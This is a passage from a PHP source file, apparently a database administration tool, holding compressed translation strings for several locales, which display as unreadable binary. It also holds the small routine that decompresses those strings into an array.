)h�=yZ��@��ޥo�\$�5�,�H#x�7��4!�¹#��6f벶z��rHHT0�gPA�2lћ3��m_Ѥ3�Ђ�{B\\���hC\r��4Hd�d �P���p���-ӣ�r� (\0PN�I#	�;�r��\r����<W���N�4��S8ZI�\"A�;�\"KS9D2�A�?3�B\r2� ����'pphΪ��*�(c��@3��B\r!a�j�˺g��p���Fva@��rE�DZnUԝ��Y��X�bP��'fL���r�L.<2�9\$�|Ȣ�]��8�	8�O���Lal��4��*i#	!�͓0�{Hs^on�<���D���'��4�\0K��͆h=��Tvai���.��Jr�q!�bDH����B�� r�<2^�V-�@D��bE�0��_f��`�\rK\nA'�j#4Hr\$�2��+c�2�̰����B�hP�Jp�K��rA��ScV��y99.IA'j_&�HS�B�>R��M&He*�Գ�*!���H���C*�����t�\"\nD\r��5�lK�iZ��߹\n�H�3�!Mj��jB�F�����_pg/0�X���\\<{��V��R*��\"�4�;*�E3�&Ȓe��,U��![If�{!d4�R�gK�wK�5\n��K)�\$��F��]߲fi4/�y̐����O��dEtu\0��C:B*w�UuT������蕄�X@PZ6�	�2�\rpzf��=(+^b\n���sk6p-�q�a��pȑbUR�;P��J����g�S&j.@hd��ʗ�b\n�VI��";break;case"sr":$f="%���)��h.��i��4���	������|Ez�\\4S֊\r��h/�P����H�P��n���v��0��G��� h��\r\n�)�E��Ȅ�:%9����>/����M}�H��`(`1ƃQ��p9�Whtu��O`�J\r�������e�;���ьF\rgK�B`����X42�]nG<^PdeCR�������F��t��ɼ� 4N�Q�� 8�'cI��g2��N9��d0�8�CA��t0��ոD1%�Co-'�3�Do�8e�A������Z����A�)�@�{b�0*;p�&�\0��\r#p΃4���\rY����] �s(�>�X�7\rn0�7(�9\r�\\\";/�9�� �踣x�:Äk!���;ƣ\"�N\"��\\���:C�*�����	z��E�<�E-����¶�-н���\"�#JҐ+d���*{�^@���5�1D�K��0j��F�9A���h�uPڬXD��*��*L������5����\nMC+T��M*�Mr�&��D����O���K��>���Ǿ	|��0(͏`�A(Ȉ�oR*�V�ck\\�Eq�J��H�\0�pH�A��b?t�в�F����.��D�?�U1eԤ5�H#f����� дm�*T�	h	@t&��Ц)�C\$�6��p�<�Ⱥ�b�>5,�\n��[.��:�rx0���2����:df0�!�^0��v���cx�3\r#>�2�Z�@���9�����l�k��[��m� �<;Cp�4�[Ey,\0P�:M�|:>�3�d*2���8�1<�S�P�7��n�<���:�c�9�è�\r�x�\n�ac�9t�0��5�6£��aJ�QԉSa���i̾	p��Ŏ�ͷ���#'x7F]�Ǿ�#\$dhn�3��:����x�������Ѩ���p^���to���\0v^�aj���:P�!�0J}-�D����\nȔ����I!(\"�ț�Z�j;;A��\$����w�����_0e}��>������{h�?�����yomh�&�Chp9����H�b��\r�l�<� iI��=��{!�i(��taI16��U�����\"\$�B%H�{�\r0�8ց\0w9��1@����r��l0�hV�+�u.�ֺ�a\"��Ӑd0�@@�U\r!�67�g	NgQ�ǭ��L\$])���'7�c��^)\0�%�+ƅ`�\0PVJc�2�E�T��sY\r�rC=c�q�I�9�<2������;�!��Z�)[&3�c`�fI<'�:A#(�t��sI.����Cppwд9���\"N�c\ry���A#e�a��9�=|�&�0!�0�����E|d2�#UjB����%^�PԐ�A.ʴ#��D�+�BB���Ohe+�L4JFV���JDR�:!F\r@� �\n�~	\$<�p��ga�p�&�C��Ha�װ���,���1��y(�ZI:�ۛ��V�<�	�L*K�f���+RQ��L��Q�iH���e��sV�u��kz6%(DԂ��\$�^�ne��biEw�CaTJ��͜��Fс�u���Qv��Q	���6Ù0T�\r5m�����-s���94l{,�3��\\��b��D����+��?ƪ���x�[d��6�-b\\�TRн��U�r0j��\\�V����Y��\$�ʿ�P]��\n�A�(�<df˄\r��4X�t�Ӆ�26���UuT��\nӎ/4�F0U\n������:��n���a��A��®ū��F���%�L��ɽ��9'�ynY#q�\$�8���i��䬒�C0y2e��.8�ƃ���ٔ��s�&�d��Rw��n~��3D��Q1U�K\rSB�hj�##\"Ю�!-�!J�Ǥ�_fP�e.!F�̬!L����=�kU���д�\\Xk�s�\0S�:CNR�5���\$LZ}%nk!1; Դ�/�B�,�*�#51�I�B���d\n\r��C��ꠥ��";break;case"sv":$f="%���(�e:�5)�@i7�	�� 6EL���p�&�)�\\\n\$0��s��8t��!�CtrZo9I\rb�%9���i�C7��,�X\nFC1��l7AL4\$8�u�OMfS��t7�AS�I� a6�&�<��b2�\$�)9H�d��7#q��u�]D(��ND�0�(�r4����\$�U0�!1�n%�(Ɖ�:]x�Id�3�O��\r�3D�pt9�tQN��������!����ݾ�r#�-�+/5��&���d�~hI�����':4�Td5gb(ī�7'\"N+<�c7\"�#̋��죦E#μ���j(\n�\$Cr�ů�\nL	è�6��3C7M�@�=��9<˫�!\"\rh�8C�����*҄3	#c��<�J����#<�C&���p&?�,-��R \n �\$�J 6L#s+( ������<�@L�N�\n50cp�5A b����ISG�b��m�C(�BC�ܺ+d(腧�DR\r� �:�@t&��Ц)�C�l<��8Z�U=RԾ R�\r��Z�\n�8à�A(���!�^0��=�e�c{\n���-�lC\nR!r�c�j�A��%#�8!�(Aw��`�'�<���Jn�\r���5���3@�f�R3���،�؈b�\r��6#�Ʃse�O��c<[N	l�����\"��V:�N/�c%.7bc�E�Msk*��C3?�f�e�h�����AU���L��N�Ñem���2�&�#&l�e[4\r�îΎR�B��!\0����D44C���x�ÅȮ־'8^���%�Ѝ6�^ܕ�\\v˔2�c�+2Hrd[\r������\\�:N\$���2t���oL���uAu��oc.���<Î�NԈ1�o7q��\$��|��\$���I)��^�4P�\"�Vy��L�8�!2h�3�H�f�7�\n	�tV�:Ha-\"a�ܯAJI��T��� ��ZQCbuO����i׺hL���VNeV!NH������-��Ӓr�HJ�B+�đ�jH�P	@�%�Ӄ�i ��[B�\n\n\0)j����B���	'<l}���^LA�3&l4�#UM��a'���JD���-���XNeaI�p��;�:��A	E�1���{�wP0�6�FX�K#A�\"\"HA��D��H\0�F�����`@�Xihf���T\"�Hz�vd��殉��W_����PBXKue���?���315��5.����\$d �����24��M\$�\\Ya��E��}�����鄺\"6�O\naQ]��`�C'&�\0����	_:a�R���I�\rd�F�!7#LP����C��Q	����@f��F\n�A�纥�C�\$3Y��%\"��*i�ޚ��N|7䞔�\"v�Z��1�\0٧5�N'�a6��azWM��b@�h���cz����ӊ��k,��4��4fXk@Ҏ/s��d#�}�n|���\0,���4�\0�\$�8���3Ɣ�T)i��(�Sʤb�l�w����sB�8KnQ~e%UR]��\$KEr�0�\\�E����v2PR獳{Rr#�\r�v�:�Z%�[�p��,�B��S\r\$l:\"ZJ�8Х��Ql@d��A�b�zZl&�(\"���Hܻ��5�%uu5��Y�GbJ؄���&\0";break;case"ta":$f="%���)��J��:���:������u�>8�@#\"��\0��p6�&ALQ\\��!����_ FK�h������3Xҽ.�B!P�t9_��`�\$RT��mq?5MN%�urι@W�DS�\n����4���;��(�pP�0��cA��n8�U���_\\��dj����?��&J��GF��M���SI�XrJ�΢_�'���JuC�^���ʽp� i4�=���xS������/Q*Ad�u'c(��oF����e3�Nb��Nd0�;�CA��t0����l�,W�K�ɨNCR,H�\0��k��7�S��*R�ޢj��MY`��,�#es�����r�ʢ����\rB������B��4��;�2�)(�|���\n�D�����@\0P�7\rn��7(�9\r㒐\">/��9�� ��;�x�\$��9�X�;̣#w�I�@���k6�G�\"I �uW(��R0,d�����\rØ�7��j*+�]�!1��%�n,L��k��\n.�uHY��3V�7drڱĪ�\\)�Kz��0\\W+�����q�1ezw�v�櫖�J)���ӮdB���H=�Ͷ\n����Z̫��kF����8�7��-��8l���2�=u@�)u��L�WbDq�#�p�ʬ�m�*��>7�]�P*̓�ȭ�p��U�j���-m�J*4�I+��q[�X���>ssPM^a8q���U�=	���[)�\$]���h��j4j���'y�/P�A j������+`���\\L��N8�F�����岪�4��Hp�\r��ą}�f�5���*b����i�9�\\�B@�	�ht)�`P�2�h��c�l<��2��e��uc�ws��r\\�L����9��\n�X�9L�1�#�x�!����@3\r#?�2�~���ȟ\\��?/?�L�������L���ʧT��7mY@��j�]��\r��c�^����6\$@�n�z��q�,����eFeͱ��V�\n\n���׬A\0uS��1�3��0u\r����t��a�P�0�p��_k`\r�:� P�L��8��x�Z	'�̟�Uq	ִU��i� X�g	H\n�i.���^RD�� �H��Aj�OD�i�z!�� ��p`����#�q+��&P���/M��:@^���>1����\"fŻ\"��*-��P�cc��_����9- �e��~M[�\"Z��/��q֑H	���#��rkO�8����\0a�A�BHi\"�d��J&i-&t��PI��M�`!�:JW��O�okG�B��wCJxLP�<OC�	eI�FKL���S�:-%@��\$�\\�5�%H\"U�T&\n�)�4������C��wC�b��ɀ����jt���øz�ia�=�����t0����R�x`�����D�b1!�W��m�PP	@�P�1�z�c�I,2H\ne\\����\0����(�G��#�y�@ekI�9G�z��s���;�#��%��\$2�Q�\\�U��U�3�Q�\"b��m4�\r��>�\0007�3Ú{O����0�?_,������^T��L)b\\lC}�T0��R�P�ҼE��JK�T��rI�}��9VYsB������b���)5U�lh�di�]�@R�G��.��)gޮ�۽px���,J���]xV5Q��]u�H��&�Baa���Eu��A�f�Z/(\n	\$<�p@KZ�\$�ϳ�zވq��9�d�c�v���02R�*���ݢz.�B��,pT� �T%�?��V^p{�A��/��0gZF&��vd8��s�f\r~g1��Wؘ��\$��7>G��*�F�ʸ��g�J�ӫ���`\$䤕�	��( \naD&���,��R�=f�Mw�8��@��ڤQʺ��yj�n�j�7����.қS֚��,�����E���Q����f���ˣl�e�(	'�6����%���+ѽ�R��W�R�]n��֊[���3�b��Z�[U�nM����8oy���rX98)\rp��W��Hc\ro��\0�Sq�|���4�ha@J@F���';x�B�T��?h��.��Yy��WPeo������l-\\l�Ll�v��P;�t�JցLni��w�����y�ٞ:t(J�:.���ٲ#k���̊`4���xXO��V�g�q_�Eg��o��\$��3��mmp�k*���F]� �)P٠T�+7�] Q=혚\"&�;�e�;�з�!�,[��J%�0x֮*K,����X7��h�	SZ\r��6���c�b�;�\\�lA0K=�(^��мo�I��{\$�,6�0�;�bB�x�\n~X2ҋb�۾���ǆV#⩎Þ��}?`�\$^I��\"J�d��O�iH�ȗ\\Ύ����q�n���֗�u����f(�.G�,�Ϭ�o6��";break;case"th":$f="%���OZAS0U�/Z���\$CDAUPȴqp������*�\n������*�\n���W	�lM1���\"��T���!���R4\\K�3u�mp����PU��q\\-c8UR\n��%bh9\\��EY�*uq2[��S�\ny8\\E�1��B�H�#'�\0P�b2��a��s=�UW	8��{��#+��&�\\K#�[��[=��-���O5�,��%�&ݶ\\&��T�J�}�'��[�A�C��\\�����k�%�'T��L�WȽg+!��'�Mb�C��� �ɼ� 4N�Q�� 8�'cI��3���@:>��2#��:\rL:#���-ڀ� �����E�M��˘���a9��~��NsL���^\\.-R\\��\"��C����CEÚΩM�R�:�����()E��<����)�CH�3��sr���R�7�!p���b�L�B��5�ø����7�I���#���|���@9�Ä�C��;�\$(θ�(��34��#mSA�Js������ت,�p�A\0b�)��>֪m�/�:�\$�J�R����\n;��~�&�u�U��*��9l�\\S,?#�N��D��N\\�M��GR��\\��Ə�6�\nH#�\n���j�&4���ŵ̝{8����R�!*�����L1	pNY�52�-SR����h�.zz�Ɨ����U5��)��C�v!T(�Z�(ju��8�<+/���`� ����V��՚�-Vr��n,��(���|5r|��\$�B��`PJ2 ��:��`P�\0�O��xH��� �(-ɇ2R��^�+����/hJ\$,�������\\uH���E�/4�!��\n\n�e�B@�	�ht)�mE��X�@_�����mz�.���f��wC��):�6���+�|9���9Nc�;#�x�!�y�yB�7�H�猾��aՅ=AЋ��O���>��A���(�\rØ���*#�Yʤ��r=�����0f\r�h2���\"��\\�ͬ��zyӉ5jP���:oB�o>���@_�ua�\0�0�C` \r��3���r���3����� \r�h:��P�J�	A5v�\r�o�5�����V�'�P������KA���ru��\0�ȝA�>03�D�t��^�@.1�\n'���xe\r��@�0���\"�UƷ����5�\n���~y\nV*�E\"�a	#�iޚ�l��[;�)�R�#����W����������Q�@96�K�RQ�0ǰ�c���rCș�.��FI������/O(\$����l��}�O��A�5�@ң�,�!�:-RԾ��	T����V&A\0S�O~1���C�{��;��r��pN��9O�C4�P��8m!�<}Tu :,����iO �Cd/l��D:�KⳃJ��c��\\��mԶ����* �(��At*��:�jP��D��)�SC��E'`)���FcZ>������[�A� ���;�\nKS��́�Gd��ci�\\dN��MP�a��Nh2��fU.���;���\"S�\0��Sc��ł��`��T��ڥ� �!�0��\r�5VQ��.�:��g��#�R��P]\0��Ԧ�P�|p�Y�*[\nq�g�h�H��)L<��Vm.�:Fu����,��H��^����I002Gk���A�	��T0fN�6���2m\"sp�?�k�P���YVTwtʔ�h����P�b�,B��Ҁ��R�:�5�B�p�:�^�ݎ+�j����Rd�Jr�/���e����'���ۄ恡܋����Q��}��j�`�Wޓ`\r3�E��3���r>i�5V��.bPK�e\"F&��a*V�����\$�����5IS�����-^\r\$�v^�j�X�@��\r=2���fuǴR���Y�)I���C`+�a�1���Qm�|\$�q�\"~Es\n��%<U\rm_PU\n����0j['�%YCA��s�:RԆ�US�|ȈµVä�E���#(�Pg�i��֔F�UR�M�\r�[��N�(\"`��:�QZeb��/*Bٴca��5~ls��WF�p����ͥ�Њ�|����PmO\n>\0�o\"�Y=4Hݚ%�v�%�/Ц�J׵r��҄�Q�\0OJÅ��Y��`��=(;�~4v招��L����������HS�=H��r��_�`";break;case"tr":$f="%���(�o9�L\";\rln2NF�a��i<��B�S`z4��h�P�\"2B!B��u:`�E��hr��2r	��L�c�Ab'��\0(`1ƃQ��p9b�(��Bi=�R�*|4��&`(�a1\r�ɮ|�^��Zɮ�K0�f�K���\n!L����x7̦ȭ� 4������k����|�\"tit�3-�z7eL��lD�a6�3ڜ�I7��F�Ӻ�AE=���F�qH7P�u�M�����n7��Q#�j|aŘ�'=���sx0�3����=g3�hȎ'a\0�=;C�h6)�j2;I`҉��\0��A	�j�%H\\:\$���&��0@�A#H�� ��:����#�\0�4�B\n��(ޡ��S\n;I�Ɯ�����B#^��cH�:��-#� P���Dy�++���CЛ����	0,��c:3��<�\nw3D�8H� i@�1ˆ\r�N1A��䈹i��0�B`ҋ���ʹc+4,����aЈ\"C�\n3��\\-�5��.�B�J�S�<��\r�����\nvL��9\$Pl�!�^0���a�n�4��8�gZ	���'i��9��l�7Cu�oD2��ܯ8#�9KW�\$\r�a��&6���ʚi�,=DC��:����\rx2̀0�\0�0�PEژ�C�r0�Qz����{��>\nX�Ӭ�\"8�Hօ�n�C�[�9d�t��a�P��dS�����=��.�^�#\"��BR\" �)8Rh�QL�8���X�%7H�&�X!\0�b���D4���9�Ax^;�n���Ar43��8^��C�����|�k��ʺ#�_5����2壣i\r��%eJ<�2�`@6/����0ryf�]AB3X�2Eї�*��\r�@\\0d��˱~X��9���.�����#|\n7p��Oz|��\0�IOQ���̭��>���*K��8�h؋�P�e�l��6E�Q�B�IK�s.�`g\$�M�����SN!a�ЂH)�s1n���f��e\"���2*d�\\-#�U���=��\"D@P9��\$�BDI('`��(�D��C(������\ne��@�RP�7>&ŢfB܀�B�\\��8I!q#0�W��\r�9A&H�T\rH֮8<Aђ3�:H9\n1�UG�G�\0�C+\"᝺�[#Ml[W���GQND�� )� �Q�8!��b4�Y�evDd��<H	p\$ǌ�1�:Bԛ�M������Z� 	��ג\$H�FB(&���GI�%(5V��<H1�=�>�0{!,&K�<��0���7��I��\"�K��\n<)�CXD��A����>��G!h����C�3+�D:���H��	8�Q��V�MߠF\n�\n^Q�=?��\0�=F�0�1@����H �M��a�%kN!�8t�;�8iL:B@�Hah�2&N���2â�95Q\0'oU�џ�uy�A�WY���uT!(ٱ\"�a��=6H�z5�\r ��W\r��˟d���P��h8BA�2 ��c����T�Z*<P�-2hFb����F���ci-�EĹ�Ǥl�N/)A�D+Q�eF��2\$�br� e)*޼��_[	(���/Ƥ\n���Bo��`��c�\n��2�h=:(����qxtR�O�j�,S�����N�uF�xp!Ix\"1kI9mz'#���l˒&�7��a\0�U�&�/�2w�s��";break;case"uk":$f="%���)��h-ZƂ���h.���� h-��m��h���Ć& h�#˘����.�(�.<�h�#�v���_�Ps94R\\����h�%��p�	Nm������c�L��4�PҒ�\0(`1ƃQ��p9�\$����&;d�H��5�}Q��\$���C��˩�Z��B��	D�8����(i�yA~�Gt(�y�g��Y�1~�Қ(��Bd��ׯK��m�JI���\r.(���V��V1>�#��\$:-���r�%C���Ǵ)/����t�p�^�\r���>�[73�'���6�SP�5dZ��{�h>/Ѡ���z0�)28�?��v�(P|\"��o���KB�\"i{*���� �5ϲ�:㹉��в���H���8ޣ�\"JB��Z�薉�(F�)��Z��Y(���\$�&�Y����6,�X\\�N�z�#����D�Z�9����)�ĵ+�;D�Lh1(�3�� �(1@ݷ��lhQ�ɠ�MH��>K� X Ě��!���аq�Q&���1�d3W�H�\\C�%�-���E5���sE�U�\$C���%-\")�Q�N�ZH�x�p��C:pʠG6��:�ղf�\"0�*�x�i\\5{�P��W�4� ��pH�A��Ǒ\rat�2�r���P�6kZך�AVİcwGV1B)��q�[K2-RhaѠR���8P���h&��\\-��.�Q�[�X2��3r�@*�|�E�*��)���|�j��n�Ls�=_(��?�\n´�&�c(�JS��\"�e=�<J�_0����>/�\$�o����c�t�����;iKCA����ϖ�m��J6=��R	�\0��Oa�&P�j~X���(�ar1���I�ӻQ+�J�N��t�Et8\\�2v�u)��	��rv�\"݋E�&���TD/v�wƇ�jxT��x��hʳyy��N���z�x�=�L��س{�5�w�J+�w/�\0>�~�߂o~o7?w>_�k�}OA���1[A<z	�=���a\"3DL��xL�Q6ɜh��x����J�&D�C m\r!�2�\$�� �\n3o���� \r�2�`z�@t��9��^üi��\$ĸ��xr�2��^xn!�4ǐ^��0\n�������\\Ǎ��H�m(dFD���W�+ӢK��'(^Uvn\n�~���+EJS�\0�:��w�)ϒXp�e�R�pb�Z��z0F(��Dj��*&(���v��:GP�c�\"lƜ�6���^ʐ��W;��!��N��XC�S�0�	m@�,�G���	e�P)�Ou-���\rU��AD�'=C/�a�(�i'�u�v��*	���&����PҘ��R��)6V��9���^�G:���Co��O)쒧լ4\0{�(��iӇ��0���\ngA<((�)�LP�sy�q=:P(����+�}(+�qV_�&��+U<x�/t�.}�\0u�i�Md�םҼf`������4���M +	�W�S�	}f)m5+�Έ���ܚ��t�hRvĖH��#�����%)�@RǦB���B 5Z�����d	D>9hЌ�S�M�\nkjF[&�-���#�j���\r^Wf�����n�\\b�fIɸ�F���K���8�+�t�M\nޮ�;���Y�/�y#5�i�D̉����8�YM��XK�P{��Ψ������s�\\\n<^\0�Tc\r5�Ӫ�	��i+�0g���\$��7�t�I��*4Υ���[�;{��h� �i�J��n�܆�!9^-����!�B�p�IsJ]�\0�Ba(I;`�M982y�ex���{�y;.C�Q��]�.������9,�D��&��B_�f�ߎ�w2�\r�\$>��V�C������4*��BD�i��#�I_5�CG��4�1�Zt���X�	.nX6��K�6�O�g�p]��Ӊ)�)�K]��B��,�� An)P��h8%�9��v.�;}�qB�W-.�\r��W\n�H�m�`>�!�Or)�}u6�3�.8���:��փ��|�?�-�ɫ,u����DiD�s�M�had�C&�'TY.xF��\nBH��^p��{��!�`t�}��4qp�d�P�8��8�q_�cw�U��6YU�Ĝ�UҶ��ed(pcF���})Z�D�p��p]U� ���ܴ�oa���n�{�`��%aĲ����)�+#�/ ��&����0�b\\N�XZDl���\\\"V��di���שm��A��X���";break;case"uz":$f="%���(�a<�\rƑ��k6LB�Nl6�L��p(�a5��1�`��u<�'A��i6�&��%4MF�`��B���\"���u2Kc'8�0��cA��n8��'3A��c4M�sI�@k7�#��**'��'3`(�;M��6,q��&�������ƙ}ģ+7��7���:B:�\rW��.3�b\r���4�����q��/�|\0(�a8�ۍ�� :`�*�{Vv��N��-�o�����)��d�g�x�i�w�7M�X(�'�b�%I��y��awu��:�D����5��������0�K�82cz�(��������\n2�#��ؗ�C�X���:\$��V�L[<�&�{♺�\nn�*2���M�4�7csX߯#��%ct�\$�n��5�L�� P�2�)s\n<�/s�&c�����\$£êr98r�f7LS ܴ� P���S���zF4�+;��-2��(���*��#�G\"�<���L�h��\\t�b\n#J7=�I�ڌ�Q��ێS�!�* 7��P��J)�t��L3l)�Bh�\nb�2�uVcͤ<��D7�#�<��N��\n|)i�1;&4��Hx�!�IX���E�����a�q�cx���}���,������+�F�MH�8jʎ1�)\"���l�P���,�\0�3\"#��յ(�2�C�hV�N:��JCX�ら1#2m�˃�R�cJ��ҍ^;t�h\"-�]4�Y3,Q��ߺ�6�3q@%z^���~\"��Y�4���>�ui���\0�>���K�묨�2'�vhf�����v	,yKJ�&��Ќ���֎C(��CC�8a�^��h\\�q9�\\Ȍ�|J���V4��xD?�̶�c��w^�B��z3�C(�K���̩�7�\0�]÷����A���5i��#�\0��O���ݍ.��7��é�3�|�:'H郣�uN��;�읣�\r��<DJH��\"\\hh�&T�^{�E鶅Є�bLH`�1��L	�,BO�E��!0��#���a��he�4�V�{j��pA	��{�6GBZ%&L`�)��aBBа��b�H\n�����Ƙp('��ֆR��*8GE%E2:Ci/2�\r���\n4+�x���VE�0#0Ď�P�E�8'�\$f�Ȱw!�t}(9~��T	H�1�T�șoxŅ��Ӷ��ؓh�0��4�&+���2rD�Y8\$4:ʦ<�A*%��P�D6�V�}`,)v��]�\0IC���7\"�\$Ⱦ�������p��95R*�<�)j=\"7�'q*,\$��P�Ǜ?%s,(�!�l?+`�?D�!|;PqH������-�3�Ι�L&T�ؗ���C\"��,�0�	�7k��#H�dWLH!�@�O�<٣6��Б�	�	�4r���Kb�GB*�Qa��0��\"�\n�*)F�*|�\rc�aъ�\n��T����q�p�;a0��N>U�l��w2u淑�J\\�\n���A�CLMt0ଊ���A��U\n�����!����v�2@�\nJ����������||6��Z��K-}a.ᐼ�󀯈�BDd��k`�\n\rtq�� Nu�]	���(�d�Q�0����bM0���ƿ�iv��G(99\$�,�K\"���#D�eC7Ad��\$�yM�K��<b��Î&�����jL�r�V�Ȥ�Q0nA,6�tI\rN��h6�\$�n��|_�r�QC'2U5���Ra,��ͫ�.";break;case"vi":$f="%���(�ha�\r�q���]��Ҍ�]��c\rTnA�j��hc,\"	�b5H�؉q��	Nd)	R!/5�!PäA&n���&��0��cA��n8��QE\r ��Y�\$�Ey�t9D0�Q�(���Vh<&b�-�[��no���\n�(�U`�+�~�da���H��8i��D��\\�Pn��p��u<�4��k{�C3��	2Rum�����]/�tUږ[�]�7;q�q�w�N(�a;m��{\rB\n'�ٻ��_���2�[aT�k7��)��o9HH����0�c+�7���67�� �8�8@�������@����� \\��j L�+@�ƻ�l7)vO�IvL���:�I�枧��fa�k��jc�]�/�P!\0��d�!�� K� P� k�<�M\0��\r��@��h4�A�N!c3�(�7\$�X�b,(�4��B�]��\r>��J N��A1���[�(�R����A����,�������\"OC��x�70�C����:�@��Lp�(`PH�� g`��X�\rn~�/e,1�L�a�M�]����PT�V�Ê�\$&���c+4J<��K\"@�	�ht)�`P�<߃Ⱥ��hZ2�P�u=L�.́IԺ:�pHx0�A��2����Ua\0��#�x�!�C��N3\r#>42�y,t;Q��4���a��@2���w���p�<V�p�4�����ÜR4Cb�#{5��Cx�3\r��ʐ�e���e=Z�#�>�.&j�(�蛢�ʾ4ë��ݍS46E�`@�rj���R/3U�A\r�e�72�\nCJˈv��8Ξ�X��� �!��6�C�1�H��������D4���9�Ax^;�p���!s�3��\0^2D��7�}�h#�Y���P�vP��@�;)�[�0�~:p�D�PS\r�4��^�GR�&��i�A+��;�j�x	�<g��S�\r���'���;Iih��SzJ��\$����DRr�,E��0Ѕ�c�C�X�?��`� U�0�7���\0w\r!�6���A�2����rAA�1À�b(l\r�<�D\"I�6�����p���li�ԡ�(eQr0FH�1���W�2N\"�[����'YFh���.CQ�A\$���%4O��!�08 �vY�g��M fp��Li�A�&����o5���T'ɨsBU�'��+�pp�=�0�C��n�3��7@-�.,�  Αh&�)� ��K�H	5:*28��k3H�]\n���R	q���t�Hj�(��\0P�vP��Q�����9����}���q	�p&�.1RpϺ!Dh\$1N\$�E'0)\$!\$����z�����X��>��:A!���'\\� �R!�\0�E� �2�G�62Ra�#�(��p��M�U��aIoY����K	q\r\r�[���<�X��a���\n	]�9Q��Wcs��	�B_P�B.�*H��&�Α��c\nD��2����p>�;�lH%��;&��QΪ�tH\\�+��!�vC	ĪF	�pR���Z\"-Y����Z�'\"G �#�2F�4Kϵ�CQt,LjURE *�@�AŜH6fvS�dL�=]�:6Py\nD���L.Ƥs�?ȩ�2����d(�V�E_\\�	����?4�.�M����]��6Mͣa@İ��y:�\n���4�`cJ�!,�C�(\nAnFr�7���P1�2I�*���!=�%j�ۭ\\�R\"�I�e���Uڧ�B+�l[~H0I\"���Mfq3W��a";break;case"zh":$f="%��:�\$\nr.����r/d�Ȼ[8� S�8�r�NT*Ю\\9�HH�Z1!S�V�J�@%9��Q�l]m	F�U��*qQ;C��f4����u�s�U�Ut� �w��:�t\nr���U:.:�PǑ.�\r7d^%��u��)c�x�U`�F��j���rs'Pn��A̛ZE��f��]��E�v���it�U��λS�ծ{�����P��g5�	E�P�N�1	V�\n���W�]\n�!z�s���ΟR�R������V�I:�(�s#.UzΠ@�:w'_�T\$��pV�L��D�')bJ�\$�pŢ���[�MZ��\n.����>s��K��AZK��aL��HAtF3���D�!zH����C��*r�e��^�K#�s��X�g)<�6���r�.��\$�) F���@��̚^��+�@���2�G)v]�C� A\rRxL�A SA b�����8s��*.]��\"h^��9zW#�s\0]�yA�)�E�tt�I�E�+!��P�\$Bh�\nb�-�5��.��h�� TUUd���i�@6�����\npC(�:�Cp@0���9#�x�!�\\Z���7��0�3ۃ-�t��@4����s��C�|�A--��	�apDJ��.ЁC`�9*��L]���~rD3N(\$QC*J�Q��3~R'Ai�����	4��yn��љt�KY G\$:W���HTd�Zr�lYO��D��Ђ2\r���9g���@gA2H��F�]���@4[#0z\r��8a�^��\\0��\r����p^2^�4�xD1�X_,\$A�E�)i�P��I:Q,\$M�)�4�4Цql���F�Z��֗l��Be�fN������o���p�ݱ�W����Ǝ|�Z���}^K'1fJ��I\\A�Łpr\$)�F؉~B�ri �NӮv��#+E �b5S!QECOj-p��q6.Ќ%B�\n����G@✺�c��a�,��S<@\$\n�����Γ�R�\n	%\$���	��#�*3�D��\$9�X��<Q���DD=&,���&``��>���\$\n.�f^6S;�y��>Ax:8�Db�t�!1KR@X�@R����H�	���v�G�PI����4��l!^ \$D����0��-���v~�(�ʌP/�\")���p� Zc�p�\"�9��&�䰀\$��s�Rȅh�@�F�]9H\n<)�F\n��ؤD�W��#ɐ�Yg��6w�,��\"J�q�\$Hp��q\0C�.xD��#@�CȈ�&	8E�0�	�/5��2VN�c��b(Q��2)���(��.fD���4���#z`)�4�M��]Ӭ�����1/���,ňɄ/DxCb��ɤ~!Ԁ�|r��/��%4���� K���o�\n��0-	E/��s	^\r�19,�V*N��b�n��q2PT�h�C�@�CH\\D\n}J&��5ҰmK��b�#�Z�%�y��񈈡@:�s3�u�9ihrX��\$R<H9\"\0��'.��o\"0�!E�r@�((�.�ƨY둂��2��(�*�b��e���fZMI�";break;case"zh-tw":$f="%��:�\$\ns�.e�UȸE9PK72�(�P�h)ʅ@�:i	��a�Je �R)ܫ{��	Nd(�vQDCѮUjaʜTOAB�P�b2��a��r\nr/Tu�ʮM9R��z�?Tא��9>�S��Ne�I̜D�hw2Y2�P�c����мW���*�=s���7���B��9�J����\"X�Q��2��M�/�J2�@\"�W��r�TD�{u������t�s�p�������S��\\=\0�V����p��\"R� )ЪOH����ΔT\\ӊ�:}J�F+��JV�*r�EZ�s�!Z�y���V꽯yP��A.���yZ�6Y�I�)\ns	�Z����̢��[��2�̒�K�d�J���12A\$�&���Y+;ZY+\$j[GAn�%�J��s�t)�P��)<�9,3r�/��\\gA2��0YD���v����`\\��:��,���IA?�ep��\0�<��(P9�+�0�0!pH����H���re��B�i�^�G1I@x���<E���9[�%�>C�y|��\"@�	�ht)�`P�<ڃȺ\r�h\\2��I����E�a\0�:�c�@)�|9���9\r�\0�z�#��0�!�^0��pv]��7�H�y���M�`G9L@�X��D�)*O�)�A����@��q,NB)P�.�C`�9.l��M�NI4rD2�r����(D�r��֌]�\"`X�ĩ.ҡq��@�Ɂ4���D�Ѱ�t�\n1|F\$9t%32D%�VA��,�O�a:��E@�2\r���9k��d@g1\nW&�H���\r���C@�:�t��D<9�x�3��(���8�:\r88^�1H4���D^�K�<�C+)��P�2�c�kz�單GG�,���]<g���A���'��*2���7���G��#w��}o^2������\"]���b%^c��	Q�+��_q)�>�Q�#��z���(\0�ly�2+E\"�eR���q��	q6����\$ØC	>&�M��r��n`��!\$-��\$H��A�3�%T���0�\$��(����k)�ߓ���J 4�Q�!J�E��00�DQ@R�[Qn	�+DI�3f((��Pb2Hp؎r�9�\0�k��ך1� ���R��G����K����&�J!Q�-�\0�F�7��\\O\\3�{�d^�B`G(���[%�G�	#��s\n�j�E�i&��N`L�\\�A�Hr��@��h�C�O	�4����3�J!����\\u��\0����,D�c�K�Ă\"G4(y�N�\"�xS\n��q�H*��=��M�8�e�\$K�X�MپȢ�\"�|�͓9��U�@	����P%dHY�t�\"Q	����րЄ�Dq�6���<6�TtB\$*x���0oT����Dêh�B	�R��Q����h���1��X��>/�Ȍ���G�6f�r:�Ps	�^lM��J&\\r�\\��,��(b��O�U\n���ʃj0��<6\ne�ī!�]o�R�h��>6ÉAr���C¨��'���R��N�bS)�K0���؉Ā���X��/Jx��j��k��ҷ�Mf�u�As\"\0�\\�ȯ�H#���]��)��x����f��)5\0\n�̩1�,�\$M�kE�_L)�";break;}$Dg=array();foreach(explode("\n",lzw_decompress($f))as$X)$Dg[]=(strpos($X,"\t")?explode("\t",$X):$X);return$Dg;}abstract
class
